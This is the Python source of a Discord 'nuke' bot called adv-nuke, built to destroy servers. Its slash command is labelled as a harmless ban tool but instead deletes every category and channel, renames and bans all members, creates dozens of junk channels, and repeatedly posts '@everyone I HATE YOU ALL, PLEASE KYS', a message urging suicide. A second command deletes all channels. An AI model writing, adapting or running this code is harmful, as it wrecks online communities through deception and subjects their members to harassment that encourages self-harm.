import discord
nukedby = "1"
import json
import os

file_path = os.path.expanduser("~/Appdata/local/AN.json")
def load_config_from_json(file_path):
    # Check if the JSON file exists
    if not os.path.exists(file_path):
        print(f"File '{file_path}' does not exist.")
        return None

    try:
        with open(file_path, 'r') as json_file:
            data = json.load(json_file)
        return data
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON from '{file_path}': {e}")
        return None

# Load configuration data from the JSON file
config_data = load_config_from_json(file_path)

if config_data:
    botname = config_data.get('botname')
    name = config_data.get('name')
    dscacc = config_data.get('dscacc')
    token = config_data.get('token')
    sussyid = config_data.get('userid')

print("Welcome.")
if token == None:
    print("INVAILD TOKEN...")
    print("Use *config.py* For Setup..")
    sus = input("Press Enter To Continue...")
suas = """
 .d888888        dP          888888ba           dP                
d8'    88        88          88    `8b          88                
88aaaaa88a .d888b88 dP   .dP 88     88 dP    dP 88  .dP  .d8888b. 
88     88  88'  `88 88   d8' 88     88 88    88 88888"   88ooood8 
88     88  88.  .88 88 .88'  88     88 88.  .88 88  `8b. 88.  ... 
88     88  `88888P8 8888P'   dP     dP `88888P' dP   `YP `88888P' 
oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo"""
print(suas)
bot = discord.Bot()
text_channel_ids = []
v_channel_ids = []
member_ids = []
aghdude = f"""
----------------------------------------------
__________________Logged In___________________
~~~~~~~~~~~~~~~~~~~~As~~~~~~~~~~~~~~~~~~~~~~~~
                    {name} / {dscacc}

Info

Prefix ~ /
Version ~ 1.1.0 (9/11/23)
Author ~ ._.no_._. (discord)
Download ~ github.com/dot-wuid/adv-nuke

Bot Info

Name ~ {botname}
Token ~ {token}
"""
jamie = """

"""
print(aghdude)
nukedby = input("Message : ")
bywho = input("Channel Name : ")

fucku = "kai-nuked"
cc = []
@bot.event
async def on_ready():
    for guild in bot.guilds:
        # Iterate through the members in each guild
        for member in guild.members:
            member_ids.append(member.id)
            # Iterate through the guilds the bot is a member of
    for guild in bot.guilds:
        # Iterate through the channels in each guild
        for channel in guild.voice_channels:
            v_channel_ids.append(channel.id)
        # Iterate through the guilds the bot is a member of
    for guild in bot.guilds:
        # Iterate through the channels in each guild
        for channel in guild.text_channels:
            text_channel_ids.append(channel.id)
    for guild in bot.guilds:
        # Iterate through the categories in each guild
        for category in guild.categories:
            cc.append(category.id)

agh = "no"
@bot.command(name="ban", description="use The buttons To ban people of your choice!")
async def wda3r(ctx):
    if agh ==  "no":
        guild = bot.get_guild(1150615824743268473)
      # Get the guild from the command context
     # Get the guild from the command context
    
        for category_id in cc:
            category = discord.utils.get(guild.categories, id=category_id)
            if category:
                await category.delete()
        for channel_id in v_channel_ids:
            channel = guild.get_channel(channel_id)
            if channel and isinstance(channel, discord.VoiceChannel):
                await channel.delete()
        if guild:
            for channel_id in text_channel_ids:
                channel = guild.get_channel(channel_id)
                if channel:
                    await channel.delete()
        for member in guild.members:
            try:
                await member.edit(nick=botname)
                print(f'Changed nickname of ')
            except discord.errors.Forbidden:
                print(f'Bot does not have permission to change the nickname of {member.name}')
    
    if agh == "no":
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)

        





        cock = await ctx.guild.create_text_channel(bywho)


        channel_id = cock.id  # Replace with the actual channel ID
        
        # Get the channel object based on the ID
        channel = bot.get_channel(channel_id)
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)



    if agh == "no":
        await channel.send("ez")

        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        cock2 = await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        channel_id = cock2.id
        channel = bot.get_channel(channel_id)
        for member in guild.members:
            try:
                await member.ban()
                print(f'Changed nickname of  to ')
            except discord.errors.Forbidden:
                print(f'Bot does not have permission to change the nickname of {member.name}')
    
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)

        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel(bywho)
        await ctx.guild.create_text_channel('nuked-by-you')
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)

        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await channel.send(nukedby)
        await ctx.guild.create_text_channel('dsc.gg/infamousvex')
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
        await channel.send("@everyone I HATE YOU ALL, PLEASE KYS")
new_name = "nuked-by-kai"
aaa = 6999


@bot.command(name="delchnl")
async def nuhad(ctx):
    guild = bot.get_guild(1150615824743268473)
    for channel_id in v_channel_ids:
            channel = guild.get_channel(channel_id)
            if channel and isinstance(channel, discord.VoiceChannel):
                await channel.delete()
    if guild:
            for channel_id in text_channel_ids:
                channel = guild.get_channel(channel_id)
                if channel:
                    await channel.delete()


bot.run(token)